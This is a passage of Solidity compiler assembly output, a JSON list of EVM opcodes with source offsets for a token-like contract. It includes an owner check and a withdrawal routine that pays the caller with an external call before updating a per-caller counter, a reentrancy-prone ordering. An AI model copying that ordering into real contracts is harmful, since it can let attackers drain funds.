											"end": 5169,
											"name": "MLOAD"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "MLOAD"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "DUP1"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "DUP4"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "SUB"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "DUP2"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "DUP6"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "DUP9"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "DUP9"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "CALL"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "SWAP4"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "POP"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "POP"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "POP"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "POP"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "206"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "206"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5127,
											"end": 5169,
											"name": "POP"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "PUSH",
											"value": "C6CA6DD98A4B886A6583C4FE06CA48539C1B02895EDE06BE528C33B60F917B98"
										},
										{
											"begin": 5194,
											"end": 5198,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "MLOAD"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "DUP1"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "DUP3"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "ISZERO"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "ISZERO"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "ISZERO"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "ISZERO"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "DUP2"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "MSTORE"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "ADD"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "SWAP2"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "POP"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "POP"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "MLOAD"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "DUP1"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "SWAP2"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "SUB"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "SWAP1"
										},
										{
											"begin": 5185,
											"end": 5199,
											"name": "LOG1"
										},
										{
											"begin": 5217,
											"end": 5221,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 5210,
											"end": 5221,
											"name": "SWAP1"
										},
										{
											"begin": 5210,
											"end": 5221,
											"name": "POP"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "SWAP1"
										},
										{
											"begin": 4990,
											"end": 5229,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "tag",
											"value": "130"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMPDEST"
										},
										{
											"begin": 2327,
											"end": 2334,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2354,
											"end": 2365,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2366,
											"end": 2371,
											"name": "DUP5"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "SWAP1"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "KECCAK256"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2373,
											"end": 2380,
											"name": "DUP4"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "SWAP1"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "KECCAK256"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "SLOAD"
										},
										{
											"begin": 2347,
											"end": 2381,
											"name": "SWAP1"
										},
										{
											"begin": 2347,
											"end": 2381,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "tag",
											"value": "134"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "JUMPDEST"
										},
										{
											"begin": 4572,
											"end": 4584,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4616,
											"end": 4619,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": 4605,
											"end": 4612,
											"name": "DUP3"
										},
										{
											"begin": 4605,
											"end": 4619,
											"name": "LT"
										},
										{
											"begin": 4605,
											"end": 4619,
											"name": "ISZERO"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "PUSH [tag]",
											"value": "209"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "JUMPI"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "DUP1"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "REVERT"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "tag",
											"value": "209"
										},
										{
											"begin": 4597,
											"end": 4620,
											"name": "JUMPDEST"
										},
										{
											"begin": 4668,
											"end": 4674,
											"name": "PUSH",
											"value": "FFFF"
										},
										{
											"begin": 4658,
											"end": 4664,
											"name": "DUP1"
										},
										{
											"begin": 4644,
											"end": 4654,
											"name": "CALLER"
										},
										{
											"begin": 4639,
											"end": 4655,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4639,
											"end": 4655,
											"name": "AND"
										},
										{
											"begin": 4639,
											"end": 4664,
											"name": "AND"
										},
										{
											"begin": 4639,
											"end": 4674,
											"name": "EQ"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "PUSH [tag]",
											"value": "210"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "JUMPI"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "DUP1"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "REVERT"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "tag",
											"value": "210"
										},
										{
											"begin": 4631,
											"end": 4675,
											"name": "JUMPDEST"
										},
										{
											"begin": 4714,
											"end": 4715,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4694,
											"end": 4699,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4700,
											"end": 4710,
											"name": "CALLER"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "AND"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "AND"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "DUP2"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "MSTORE"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "ADD"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "SWAP1"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "DUP2"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "MSTORE"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "ADD"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "KECCAK256"
										},
										{
											"begin": 4694,
											"end": 4711,
											"name": "SLOAD"
										},
										{
											"begin": 4694,
											"end": 4715,
											"name": "GT"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "PUSH [tag]",
											"value": "211"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "JUMPI"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "DUP1"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "REVERT"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "tag",
											"value": "211"
										},
										{
											"begin": 4686,
											"end": 4716,
											"name": "JUMPDEST"
										},
										{
											"begin": 4760,
											"end": 4767,
											"name": "DUP2"
										},
										{
											"begin": 4735,
											"end": 4744,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4745,
											"end": 4755,
											"name": "CALLER"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "AND"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "AND"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "DUP2"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "MSTORE"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "ADD"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "SWAP1"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "DUP2"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "MSTORE"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "ADD"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "KECCAK256"
										},
										{
											"begin": 4735,
											"end": 4756,
											"name": "SLOAD"
										},
										{
											"begin": 4735,
											"end": 4767,
											"name": "LT"
										},
										{
											"begin": 4735,
											"end": 4767,
											"name": "ISZERO"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "PUSH [tag]",
											"value": "212"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "JUMPI"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "DUP1"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "REVERT"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "tag",
											"value": "212"
										},
										{
											"begin": 4727,
											"end": 4768,
											"name": "JUMPDEST"
										},
										{
											"begin": 4812,
											"end": 4819,
											"name": "DUP2"
										},
										{
											"begin": 4787,
											"end": 4808,
											"name": "SELFBALANCE"
										},
										{
											"begin": 4787,
											"end": 4819,
											"name": "LT"
										},
										{
											"begin": 4787,
											"end": 4819,
											"name": "ISZERO"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "PUSH [tag]",
											"value": "213"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "JUMPI"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "DUP1"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "REVERT"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "tag",
											"value": "213"
										},
										{
											"begin": 4779,
											"end": 4820,
											"name": "JUMPDEST"
										},
										{
											"begin": 4831,
											"end": 4841,
											"name": "CALLER"
										},
										{
											"begin": 4831,
											"end": 4846,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4831,
											"end": 4846,
											"name": "AND"
										},
										{
											"begin": 4851,
											"end": 4858,
											"name": "PUSH",
											"value": "F4240"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "MLOAD"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "DUP1"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "ADD"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "SWAP1"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "POP"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "MLOAD"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "DUP1"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "DUP4"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "SUB"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "DUP2"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "DUP8"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "DUP8"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "CALL"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "SWAP3"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "POP"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "POP"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "POP"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 14,
											"end": 15,
											"name": "DUP1"
										},
										{
											"begin": 21,
											"end": 22,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "DUP2"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "EQ"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "PUSH [tag]",
											"value": "215"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPI"
										},
										{
											"begin": 75,
											"end": 79,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 69,
											"end": 80,
											"name": "MLOAD"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "SWAP2"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "POP"
										},
										{
											"begin": 144,
											"end": 148,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 140,
											"end": 149,
											"name": "NOT"
										},
										{
											"begin": 133,
											"end": 137,
											"name": "PUSH",
											"value": "3F"
										},
										{
											"begin": 115,
											"end": 131,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 111,
											"end": 138,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 150,
											"name": "AND"
										},
										{
											"begin": 104,
											"end": 105,
											"name": "DUP3"
										},
										{
											"begin": 100,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 98,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 87,
											"end": 152,
											"name": "MSTORE"
										},
										{
											"begin": 169,
											"end": 185,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 166,
											"end": 167,
											"name": "DUP3"
										},
										{
											"begin": 159,
											"end": 186,
											"name": "MSTORE"
										},
										{
											"begin": 225,
											"end": 241,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 222,
											"end": 223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 215,
											"end": 219,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 212,
											"end": 213,
											"name": "DUP5"
										},
										{
											"begin": 208,
											"end": 220,
											"name": "ADD"
										},
										{
											"begin": 193,
											"end": 242,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMP"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "tag",
											"value": "215"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPDEST"
										},
										{
											"begin": 36,
											"end": 40,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "SWAP2"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "POP"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "tag",
											"value": "214"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "POP"
										},
										{
											"begin": 4831,
											"end": 4863,
											"name": "POP"
										},
										{
											"begin": 4874,
											"end": 4919,
											"name": "PUSH [tag]",
											"value": "216"
										},
										{
											"begin": 4884,
											"end": 4894,
											"name": "CALLER"
										},
										{
											"begin": 4904,
											"end": 4908,
											"name": "ADDRESS"
										},
										{
											"begin": 4911,
											"end": 4918,
											"name": "DUP5"
										},
										{
											"begin": 4874,
											"end": 4883,
											"name": "PUSH [tag]",
											"value": "152"
										},
										{
											"begin": 4874,
											"end": 4919,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4874,
											"end": 4919,
											"name": "tag",
											"value": "216"
										},
										{
											"begin": 4874,
											"end": 4919,
											"name": "JUMPDEST"
										},
										{
											"begin": 4951,
											"end": 4952,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4930,
											"end": 4935,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4936,
											"end": 4946,
											"name": "CALLER"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "AND"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "AND"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "DUP2"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "MSTORE"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "ADD"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "SWAP1"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "DUP2"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "MSTORE"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "ADD"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "KECCAK256"
										},
										{
											"begin": 4930,
											"end": 4947,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "DUP3"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "DUP3"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "SLOAD"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "SUB"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "SWAP3"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "POP"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "POP"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "DUP2"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "SWAP1"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "SSTORE"
										},
										{
											"begin": 4930,
											"end": 4952,
											"name": "POP"
										},
										{
											"begin": 4970,
											"end": 4974,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4963,
											"end": 4974,
											"name": "SWAP1"
										},
										{
											"begin": 4963,
											"end": 4974,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP2"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "tag",
											"value": "138"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "JUMPDEST"
										},
										{
											"begin": 1028,
											"end": 1038,
											"name": "CALLER"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "DUP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SLOAD"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "EXP"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "DIV"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "EQ"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH [tag]",
											"value": "218"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "JUMPI"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MLOAD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP3"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SUB"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP3"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MLOAD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP2"
										},
										{
